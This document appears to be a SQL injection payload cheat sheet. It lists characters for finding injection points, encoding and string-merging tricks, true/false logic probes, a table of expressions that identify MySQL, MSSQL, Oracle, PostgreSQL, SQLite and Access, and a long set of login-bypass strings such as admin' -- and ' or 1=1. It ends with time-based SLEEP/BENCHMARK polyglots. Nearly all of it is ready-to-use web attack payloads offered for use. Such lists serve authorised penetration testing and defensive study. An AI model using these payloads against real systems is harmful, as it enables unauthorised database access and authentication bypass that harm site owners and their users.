# Entry point detection
- [ ] Simple characters
```
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos; # required for XML content
```
- [ ] Multiple encoding
```js
%%2727
%25%27
```
- [ ] Merging characters
```
`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP
```
- [ ] Logic Testing
```
age.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
- [ ] weired chars (unicode)
```
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
```
# DBMS Identification

| Expression | DB |
|---|---|
| `conv('a',16,2)=conv('a',16,2)` | MYSQL |
| `connection_id()=connection_id()` | MYSQL |
| `crc32('MySQL')=crc32('MySQL')` | MYSQL |
| `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` | MSSQL |
| `@@CONNECTIONS>0` | MSSQL |
| `@@CONNECTIONS=@@CONNECTIONS` | MSSQL |
| `@@CPU_BUSY=@@CPU_BUSY` | MSSQL |
| `USER_ID(1)=USER_ID(1)` | MSSQL |
| `ROWNUM=ROWNUM` | ORACLE |
| `RAWTOHEX('AB')=RAWTOHEX('AB')` | ORACLE |
| `LNNVL(0=123)` | ORACLE |
| `5::int=5` | POSTGRESQL |
| `5::integer=5` | POSTGRESQL |
| `pg_client_encoding()=pg_client_encoding()` | POSTGRESQL |
| `get_current_ts_config()=get_current_ts_config()` | POSTGRESQL |
| `quote_literal(42.5)=quote_literal(42.5)` | POSTGRESQL |
| `current_database()=current_database()` | POSTGRESQL |
| `sqlite_version()=sqlite_version()` | SQLITE |
| `last_insert_rowid()>1` | SQLITE |
| `last_insert_rowid()=last_insert_rowid()` | SQLITE |
| `val(cvar(1))=1` | MSACCESS |
| `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` | MSACCESS |
| `cdbl(1)=cdbl(1)` | MSACCESS |
| `1337=1337` | MSACCESS, SQLITE, POSTGRESQL, ORACLE, MSSQL, MYSQL |
| `'i'='i'` | MSACCESS, SQLITE, POSTGRESQL, ORACLE, MSSQL, MYSQL |
# Authentication bypass

```
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

# Polyglots (multicontext)
```
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
/* MySQL only */
IF(SUBSTR(@@version,1,1)
<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)
<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1
)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```
